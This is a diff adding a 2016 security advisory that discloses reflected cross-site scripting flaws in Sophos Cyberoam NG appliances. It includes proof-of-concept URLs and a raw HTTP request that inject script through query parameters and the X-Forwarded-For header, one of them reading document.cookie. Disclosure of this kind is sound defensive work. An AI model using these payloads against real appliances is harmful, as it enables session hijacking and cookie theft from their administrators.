@@ -1,0 +1,78 @@
+
+Sophos Cyberoam NG Series Multiple Cross-Site Scripting Vulnerabilities
+
+
+Vendor: Sophos Technologies Pvt. Ltd.
+Product web page: http://www.cyberoam.com
+Affected version: Model: CR100iNG, FW: 10.6.3 MR-1 (Build 503)
+                  Model: CR35iNG, FW: 10.6.2 MR-1 (Build 383)
+                  Model: CR35iNG, FW: 10.6.2 (Build 378)
+
+Summary: Cyberoam NG series of Unified Threat Management appliances are
+the Next-Generation network security appliances that include UTM security
+features along with performance required for future networks. The NG series
+for SMEs are the 'fastest UTMs' made for this segment. The best-in-class
+hardware along with software to match, enables the NG series to offer unmatched
+throughput speeds, compared to any other UTM appliance in this market segment.
+This assures support for future IT trends in organizations like high-speed
+Internet and rising number of devices in organizations – offering future-ready
+security to SMEs.
+
+Desc: Multiple reflected XSS issues were discovered in Cyberoam NG appliances.
+Input passed via the 'ipFamily', 'applicationname' and 'username' GET parameters
+to LiveConnections.jsp and LiveConnectionDetail.jsp is not properly sanitised
+before being returned to the user. Adding arbitrary 'X-Forwarded-For' HTTP header
+to a request makes the appliance also prone to a XSS issue. This can be exploited
+to execute arbitrary HTML and script code in a user's browser session in context
+of an affected site.
+
+Tested on: Linux
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5313
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5313.php
+
+Vendor: https://docs.cyberoam.com/default.asp?id=447&Lang=1&SID=
+
+
+29.01.2016
+
+--
+
+
+#1
+https://127.0.0.2/corporate/webpages/trafficdiscovery/LiveConnections.jsp?ipFamily=1';alert(1)//&popup=0&t=Fri%20Jan%2029%202016%2014:17:10%20GMT+0100%20(Central%20European%20Standard%20Time)
+
+#2
+https://127.0.0.2/corporate/webpages/trafficdiscovery/LiveConnectionDetail.jsp?ipFamily=0<script>alert(1)</script>&applicationname=GTALK%2520ANDROID<script>alert(2)</script>&username=NA<script>alert(3)</script>
+
+#3
+GET /corporate/webpages/index.jsp HTTP/1.1
+Host: 127.0.0.2
+Connection: close
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
+Referer: https://127.0.0.2/corporate/webpages/index.jsp
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Cookie: JSESSIONID=7ee4qwuyt6yl1uayrqtw6qrmu
+X-Forwarded-For: 127.0.0.1</script><script>alert(document.cookie)</script>
+
+--
+
+HTTP/1.1 200 OK
+...
+...
+<script language="javascript">	
+	Cyberoam.setContextPath('/corporate');
+	Cyberoam.LoggedInUserIP = "127.0.0.1</script><script>alert(document.cookie)</script>, 10.0.0.2";
+	Cyberoam.images = "themes/lite1/images";
+	Cyberoam.language = "English";
+	Cyberoam.version = "10.06 build 3503";
+...
+...
